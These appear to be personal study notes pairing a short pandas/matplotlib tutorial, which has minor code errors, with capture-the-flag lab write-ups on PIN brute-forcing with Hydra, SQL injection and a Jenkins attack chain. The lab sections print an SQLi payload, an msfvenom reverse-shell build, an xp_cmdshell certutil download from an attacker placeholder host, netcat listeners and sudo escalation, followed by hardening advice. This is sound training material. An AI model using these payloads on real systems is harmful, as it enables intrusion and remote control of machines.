To make a list with index of an  list

```python
import panda
new_variable = panda.Series(variable)
print(new_variable)

0    Train
1    Plane
2      Car
dtype: object
```

Dataframe:

```python 
import panda
data = [['Ben', 24, 'United Kingdom'],
        ['Jacob', 32, 'United States of America'],
        ['Alice', 19, 'Germany']]

```python
import panda as pd
import matplotlib.pyplot as plt

plt.plot()
```
![[Pasted image 20231202155417.png]]

Add data to the plot
```python
# We'll start by making a very simple plot using an array before we get into the nitty-gritty. 
# Remembering it goes X -> Y. Along the corridor and up the stairs!
plt.plot(['January', 'February', 'March', 'April' ],[8,14,23,40])
```
![[Pasted image 20231202155348.png]]

| Function   | Description                                              |
|------------|----------------------------------------------------------|
| plt.ylabel | This function allows us to specify a label for the Y axis.|
| plt.xlabel | This function allows us to specify a label for the X axis.|
| plt.title  | This function allows us to specify a title for the plot.  |

Implement Name for Axes and the Graph
```python
plt.xlabel('Months of the Year')
plt.ylabel('Number of Toys Produced')

plt.title('A Line Graph Showing the Number of Toys Produced Between September and December')

plt.plot(['September', 'October', 'November', 'December' ],[8,14,80,160])
```
![[Pasted image 20231202155637.png]]

Create a graph from a .csv file:
```python
# Step #1.
spreadsheet = pd.read_csv('drinks.csv')

# Step #2.
drinks = spreadsheet['Drink']
votes = spreadsheet['Vote']


# Step #3.
# Here, we are going to tell pyplot the size of the figure. Find a value that improves readability
plt.figure(figsize=(10, 6))  # Adjust the figure size as needed


# plt.bar tells pyplot to use a bar graph. the `h` means horizontal, `v` can be used for a vertical bar graph.
plt.barh(drinks, votes, color='skyblue')

# Set the labels for the graph
plt.xlabel('Number of Votes')
plt.ylabel('Name of Drink')
plt.title('A Bar Graph Showing the Employees Favourite Drinks')
plt.gca().invert_yaxis()  # Optional - invert the y-axis for better readability (most popular at the bottom)
```

### Day 3 - Brute-forcing

We can use crunch to generate password list with characters:
```bash
crunch 3 3 0123456789ABCDEF -o 3digits.txt
```
- `3` the first number is the minimum length of the generated password
- `3` the second number is the maximum length of the generated password
- `0123456789ABCDEF` is the character set to use to generate the passwords
- `-o 3digits.txt` saves the output to the `3digits.txt` file

Manually trying out PIN codes is daunting. We use an automated tool, **Hydra**, for trying password combinations efficiently.

#### Steps
1. **View Page HTML**: Right-click on the page and select "View Page Source".
2. **Identify Key Elements**:
   - 1 - Method: `post`
   - 2 - URL: `http://10.10.55.90:8000/login.php`
   - 3 - PIN Code Name: `pin`
![[Pasted image 20231203225409.png]]

#### Hydra Usage
The main login page (`http://10.10.55.90:8000/pin.php`) sends the input to `/login.php` using the name `pin`. We'll use Hydra to test every possible password.

#### Command
````hydra -l '' -P 3digits.txt -f -v 10.10.55.90 http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000````
#### Explanation
- `-l ''`: Login name is blank, only password required.
- `-P 3digits.txt`: Password file.
- `-f`: Stop after finding a working password.
- `-v`: Verbose output.
- `10.10.55.90`: IP address of the target.
- `http-post-form`: HTTP method.
- `"/login.php:pin=^PASS^:Access denied"`: Three parts separated by `:`. 
  - `/login.php`: Submission page.
  - `pin=^PASS^`: Replaces `^PASS^` with password list values.
  - `Access denied`: Text indicating an invalid password.
- `-s 8000`: Port number on the target.

```bash
[VERBOSE] Page redirected to http://10.10.55.90:8000/error.php
[VERBOSE] Page redirected to http://10.10.55.90:8000/error.php
[8000][http-post-form] host: 10.10.55.90   password: 6F5
[STATUS] attack finished for 10.10.55.90 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2023-12-04 04:00:12
```
 Flag = THM{pin-code-brute-force}

### Day 10 - SQL Injection

##### Overview
- **Structured Query Language (SQL)**: Essential for relational databases and dynamic websites.
- **Usage**: Frequently used indirectly in everyday activities like online banking, shopping, and social media.
- **Popularity**: One of the most prevalent languages for database interaction.

##### Relational Databases
- **Structure**: Organized into tables with rows and columns.
- **Interconnectivity**: Tables linked through predefined relationships.
- **Example**: E-commerce database with "customers", "orders", and "products" tables.

##### SQL Functions
- **Operations**: Query, insert, update, and delete data.
- **Syntax**: English-like with keywords like SELECT, FROM, WHERE, JOIN.

##### Example: Christmas Tree Ornaments Database
- **Table**: `tbl_ornaments` with columns like `ornament_id`, `elf_id`, `colour`.
- **Sample Queries**:
  - `SELECT * FROM tbl_ornaments WHERE material = 'Wood';`
  - `SELECT ornament_id, colour, category FROM tbl_ornaments WHERE elf_id = 102;`
  - `INSERT INTO tbl_ornaments (...) VALUES (5, 105, 'Blue', 'Star', 'Glass', '2023-12-10', 4.99);`

#### PHP
- **Functionality**: Server-side scripting language for dynamic and interactive websites.
- **Integration**: Works seamlessly with SQL databases.
- **Tasks**: Connects to databases, processes form data, generates web content.
- **Database Connection**: Uses PHP Data Objects (PDO) or database-specific drivers.

##### Example: Dynamic SQL Queries in PHP
- **Process**: Fetching and displaying database information based on user input.
- **Dynamic Query**: Using GET parameters to create user-driven SQL queries.
- **Security**: Emphasizes the importance of sanitizing user input to prevent SQL injection.

#### SQL Injection (SQLi)

##### Example: Vulnerability Exploitation
- **Demonstration**: Using `' OR 1=1 --` to manipulate queries and retrieve unauthorized data.
  ```sql
  SELECT * FROM tbl_ornaments WHERE colour = '' OR 1=1 --'

- **Impact**: Potentially catastrophic, leading to data breaches or system compromise.

#### Remote Code Execution

##### Executing Reverse Shell
- **Stored Procedures**: Use of `xp_cmdshell` in SQL Server for operating system interactions.
- **Reverse Shell**: Establishing a reverse TCP connection for direct interaction with the target machine.
- **Method**: Use of tools like MSFvenom to create a payload and Netcat for listening.
- **Payload Generation**: Creating an executable using MSFvenom.
  ```bash
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR.IP.ADDRESS.HERE LPORT=4444 -f exe -o reverse.exe
  ```
- **Execution**: Downloading and executing the payload on the target system via SQL injection.
  ```sql
  ' ; EXEC xp_cmdshell 'certutil -urlcache -f http://YOUR.IP.ADDRESS.HERE:8000/reverse.exe C:\Windows\Temp\reverse.exe'; --
  ```
- **Connection**: Setting up a Netcat listener to catch the reverse shell.
  ```bash
  nc -lnvp 4444
  ```

#### Conclusion
- **Best Practices**: Validate input, use parameterized statements, and employ stored procedures to mitigate SQLi risks.
- **Overall**: SQL and PHP play crucial roles in database-driven web development, emphasizing the need for security and proper handling of user inputs.

### Day 12 - Defence in Depths
#### Guided Walkthrough of the Attack Chain

##### Accessing Jenkins
- **Entry Point**: Jenkins available at `http://10.10.165.187:8080`.
- **Interface**: Jenkins Home Page accessible via Firefox.

##### Getting a Web Shell
- **Method**: Utilizing Jenkins' Script Console feature.
- **Process**:
  - Navigate to "Manage Jenkins".
  - Use Script Console to execute a Groovy script for reverse shell.
- **Groovy Reverse Shell Script**:
  ```groovy
  String host="attacking machine IP"; int port=6996; String cmd="/bin/bash"; ... (truncated for brevity) ... ;p.destroy();s.close();
   ```
  - Replace `host` with attacking machine's IP.
  - Set up a netcat listener: `nc -nvlp 6996`.
  - Execute the script and establish a reverse shell.

##### Getting the tracy User and Root
- **Discovery**: Locating a useful script `backup.sh` in `/opt/scripts`.
- **Credentials**: Extracting user `tracy` credentials from the script.
- **SSH Login**: Using SSH to log into `tracy@10.10.165.187`.
- **Privilege Escalation**: Checking sudo permissions with `sudo -l`, then escalating to root with `sudo su`.

##### Defense in Depth and its Role in Hardening
- **Concept**: Implementing multiple layers of security to complicate attacker's efforts.
- **Objective**: Making it difficult for attackers to succeed, even if some defenses are bypassed.

##### Guided Hardening of the Server
- **Removal of tracy from Sudo Group**:
  - Command: `sudo deluser tracy sudo`.
  - Verification: `sudo -l -U tracy`.

##### Hardening SSH
- **Method**: Disabling password-based SSH logins.
- **Configuration**:
  - Edit `/etc/ssh/sshd_config`: Set `PasswordAuthentication no`.
  - Restart SSH service: `sudo systemctl restart ssh`.

##### Stronger Password Policies
- **Focus**: Implementing robust password policies and encouraging better password practices.

##### Promoting Zero Trust
